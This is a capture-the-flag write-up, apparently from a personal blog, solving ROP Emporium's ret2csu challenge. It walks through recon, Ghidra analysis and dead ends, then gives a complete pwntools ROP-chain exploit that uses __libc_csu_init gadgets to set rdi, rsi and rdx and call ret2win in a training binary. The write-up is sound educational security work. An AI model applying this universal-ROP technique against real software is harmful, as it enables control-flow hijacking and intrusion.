---
title: "ROPemporium — ret2csu"
date: 2026-06-05
ctf: "ROPemporium"
category: "pwn"
difficulty: "medium"
tags: ["pwn", "rev", "unversalROP", "x86-64"]
description: "last challenge of ROPemporium — what a universal ROP looks like"
---

## Overview:
This is the last challenge of ROP Emporium. It is a crucial test of whether you truly understand how a ROP chain works, and it serves as a canonical example of the Universal ROP technique. Understanding ret2csu is essential for any security researcher, as it demonstrates how **gadgets embedded by the compiler** itself **not the developer** can be weaponized to control function arguments that would otherwise be unreachable. Mitigations do exist and should be implemented in every compiled C binary. At the bottom of this page I will link the original research paper, also available for download directly from ROP Emporium, which covers both the exploit technique and the recommended countermeasures for real-world environments.

## Recon:

Let's start with some classic reconnaissance on the binary.
```bash
$ file ./ret2csu
 ret2csu: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=f722121b08628ec9fc4a8cf5abd1071766097362, not stripped
```
Nothing special a standard ELF binary dynamically linked against the C library.

Next, let's inspect the strings embedded in the binary to get an early picture of what it does.
```bash
$ strings ./ret2csu
	...
	pwnme
	ret2win
	main
	(* output abbrevieted *)
```
Nothing particularly revealing here. We can already guess that we need to call `ret2win()` with three specific arguments, but that is only because the ROP Emporium challenge page tells us so explicitly.

Now let's check the binary's mitigations with  `rabin2`
```bash 
$ rabin2 -I ./ret2csu
 	(...)
	nx       true  #<=== nx enable like the previous challenge on ROPemporium
	os       linux
	pic      false
	relocs   true
	relro    partial
	rpath    .
	sanitize false
	static   false
	stripped false
	subsys   linux
	va       true
	(* output abbrivieted *)
```
A surface-level recon pass reveals nothing different from the previous challenge: NX is enabled, no PIE, partial RELRO, and symbols are not stripped. We will need to dive into a deeper static analysis to make progress.

Running the binary under `pwndbg` confirms nothing new: the stack overflow is trivially exploitable as in previous challenges. The real difficulty lies in populating the three argument registers correctly before calling ret2win.

## Static analysis & Reasoning:
Let's take a deep dive into the static analysis.

`main()` & `usefulFunction()`:

![Ghidra analysis main & usefulFunction](/images/ghidra_ret2csu_usefulFunction.png)

No useful gadgets or opcodes here. The only valuable information `usefulFunction()` gives us is a concrete example of which registers are used to pass arguments, and in what order: `rdi`, `rsi`, and `rdx`.

The natural next step is to look for a function that actually operates on those registers which leads us to:

`__libc_csu_init():`:

![Ghidra analysis libc](/images/ghidra_ret2csu_usefulFunction.png)

This function contains several useful gadgets that we will leverage in the exploit. The full reasoning is covered in the next section.

It is also worth checking whether the binary imports any interesting external functions.

`GOT(global offset table):`

![Ghidra anlysis GOT](/images/ghidra_ret2csu_GOT.png)

Nothing directly exploitable in the GOT either. Notably, even `pwnme()` is imported from the shared library, which means we cannot rely on any external function to assist us our entire exploit must be built around the gadgets found inside `__libc_csu_init()`.

### Mistakes and dead ends:

There are two significant mistakes that one can easily make in this challenge. The first is failing to recognize the two standalone gadgets hidden at the tail end of `__libc_csu_init()`: the `pop rdi` (`0x5f`) and `pop rsi` (`0x5e`) opcodes. These are easy to overlook because they are not part of the main gadget pair that the ret2csu technique is typically built around.
The second mistake and admittedly the one that cost me the most time is assuming there must be some other way to control rdx outside of `__libc_csu_init()`. I spent a significant amount of time hunting for an alternative `pop rdx` gadget, not realizing that there were functions already present in the binary acting as pointers to other functions. This means that the `call qword ptr [r12 + rbx*0x8]` instruction could be satisfied with a safe, controlled target making it unnecessary to bypass it entirely and rendering the search for an alternative gadget pointless.

### Reasoning:

To complete this challenge you need to be familiar with two specific opcodes: `pop rdi` (`0x5f`) and `pop rsi` (`0x5e`). You also need to know how to combine static and dynamic analysis effectively.
The reasoning is fairly straightforward. We need to load the correct values into three registers. Two of them are trivial we just call the corresponding gadget and pop the value directly off the stack. The third one, `rdx`, is more complex and is therefore the first one we are going to set up.

Register	  Value						  Gadgets	
`RDI` 		 `0xdeadbeefdeadbeef` 		 `pop RDI`
`RSI` 		 `0xcafebabecafebabe` 		 `pop RSI`
`RDX` 		 `0xd00df00dd00df00d` 		 `mov RDX R15`

To control rdx via the `mov rdx, r15` gadget inside `__libc_csu_init()`, we need to safely navigate past the next instruction: `call qword ptr [r12 + rbx*0x8]`. By inspecting the binary in Ghidra, we can find several internal function pointers already embedded in the file.

![Ghidra anlysis Pointer function](/images/ghidra_ret2csu_pointerfunction.png)

I chose to point `r12` at the `__do_global_dtors_aux_fini_array_entry` section, which holds a valid internal function pointer and allows the call to execute without crashing. Initially it did not seem to work, so I attached gdb and discovered that I also needed to satisfy the condition at `0x400691`, beacuse from the call of the first function it actually jump a few times and then land here: 

![Ghidra anlysis Pointer function](/images/ghidra_ret2csu_laststep.png)

The condition at `0x400691` is a `cmp rbp, rbx` check. To pass it without triggering the jump, we simply set `rbx = 0` and `rbp = 1` before entering the gadget. If you want a clearer picture of why this is necessary, I suggest setting `rbp = 0` and running `pwndbg ./ret2csu` yourself to see what happens.


## Exploit:

```python3
#!/bin/env python3
from pwn import *

def exploit():
	context.log_level = "info"
	elf = context.binary = ELF("/home/notsafe/pwn/ROP_Emporium/ret2csu/ret2csu", checksec=False)
	p = process(elf.path)
	payload = flat(
			   b"A"*40, 				# padding
			   p64(0x40069a), 			#set up gedget for RDX
			   p64(0x0), 				#rbx = 0
			   p64(0x1), 				# RBP = 1
			   p64(0x600df8), 			# r12 = __do_global_dtors_aux_fini_array_entry (safe call target)
			   p64(0x0), 				# r13 = 0 (unused)
			   p64(0x0), 				# r14 = 0 (unused)
			   p64(0xd00df00dd00df00d), # r15 = target value to move into RDX
			   p64(0x400680), 			# execute: mov rdx, r15; mov rsi, r14; mov edi, r13d; call [r12+rbx*0x8]
			   #skip past the post-call section (add rsp, 0x8 + 6 pops) to avoid a crash
			   p64(0x0),				# add rsp, 0x8 padding
			   p64(0x0),				# pop RBX
			   p64(0x0),				# pop RBP
			   p64(0x0),				# pop r12
			   p64(0x0),				# pop r13
			   p64(0x0),				# pop r14
			   p64(0x0),				# pop r15
			   p64(0x4006a1), 			# jump to: pop RSI; ret
			   p64(0xcafebabecafebabe), # value RSI
			   p64(0x0), 				# r15 = 0 (padding)
			   p64(0x4006a3), 			#jump to: pop RDI, ret
			   p64(0xdeadbeefdeadbeef), # value RDI
			   p64(0x40062a), 			#call <ret2win>
	)
	p.recvuntil(b"> ")
	p.send(payload)
	p.recvuntil(b"Thank you!")
	flag = p.recvall()
	print("=========FLAG=========")
	success(flag.decode().split("\n")[1])

exploit()
```

## Result:

Finally, after the exploitation, we achieved our flag!

<div class="flag-box">ROPE{a_placeholder_32byte_flag!}</div>

## Takeaways:

- Universal ROP 

- KISS method (Keep it simple, stupid), if the gadget is already in front of you, don't waste time hunting for alternatives.

- Mitigation of the universal ROP 

- Static + dynamic analysis: neither Ghidra alone nor pwndbg alone was enough; the solution only became clear by combining both.

## Dowloads:

[ret2csu Paper (Mitigations and exploitation in a real enviroment)](https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf)
